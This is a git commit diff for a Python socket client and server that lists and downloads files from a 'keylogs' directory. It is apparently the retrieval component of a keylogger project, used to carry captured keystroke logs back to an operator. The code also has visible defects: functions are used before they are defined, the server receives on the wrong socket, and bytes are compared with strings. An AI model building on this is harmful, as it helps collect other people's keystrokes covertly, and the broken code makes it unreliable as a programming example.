1c162d936c85104b18795e8f331570dec6648a5d
plebeian <e>
2021-03-25 12:36:14 -0400

    Added file transferring capability.

--- src/fileclient.py
+++ src/fileclient.py
@@ -15,7 +15,35 @@ try:
     print("Connecting to " + server_ip + " on port " + server_port + "\n")
     clientsocket.connect((server_ip, int(server_port)))
     data = clientsocket.recv(buffer_size)
+    print (data.decode())
+    while(True):
+        user_command = input("\n Enter a command: \n")
+        user_command.replace(" ", "")
+        if user_command[0:4] == "pull":
+            _pull_file(user_command)
+        elif user_command[0:4] == "quit":
+            sent_data = "quit"
+            clientsocket.send(sent_data.encode())
+            break
+        else:
+            print("Command not understood.\n")
+
 finally:
     clientsocket.close()
 
-print (data.decode())
+def _pull_file(user_command):
+    filename = user_command[4:]
+    sent_data = ("pull" + filename)
+    clientsocket.send(sent_data.encode())
+    status = clientsocket.recv(buffer_size)
+    if status.decode() == "failure":
+        print("Failed to retreive file.\n")
+    elif status.decode() == "success":
+        print("Downloading file...\n")
+        f = open (filename, 'wb')
+        l = clientsocket.recv(buffer_size)
+        while(l):
+            f.write(l)
+            l = clientsocket.recv(buffer_size)
+
+
--- src/fileserver.py
+++ src/fileserver.py
@@ -20,9 +20,44 @@ while(True):
     print ('Connected to ', address)
     #displaying the directory
     print ('Sending directory information...')
-    directory_data = os.listdir()
-    data = "====Keylog Files====\n" + "\n".join(directory_data)
-    connection.send(data.encode())
+    directory_data = os.listdir(path = './keylogs/')
+    sent_data = "====Keylog Files====\n" + "\n".join(directory_data)
+    connection.send(sent_data.encode())
+    #now listen for a command from client
+    while(True):
+        command = serversocket.recv(buffer_size)
+        decode_command = command.decode()
+        keyword = command[0:4]
+        if keyword == "pull":
+            _pull_file(decode_command)
+        elif keyword == "quit":
+            break
+        else:
+            sent_data = "Command not understood.\n"
+            connection.send(sent_data.encode())
+
     connection.close()
 
 serversocket.close()
+
+
+def _pull_file(decode_command):
+    filename = decode_command[4:]
+    if filename[0:1] == ".":
+        sent_data = "failure"
+        connection.send(sent_data.encode())
+        return
+    try:
+        f = open (filename, 'rb')
+    except FileNotFoundError:
+        sent_data = "failure"
+        connection.send(sent_data.encode())
+    else:
+        sent_data = "success"
+        connection.send(sent_data.encode())
+        l = f.read(buffer_size)
+        while (l):
+            connection.send(l)
+            l = f.read(buffer_size)
+
+
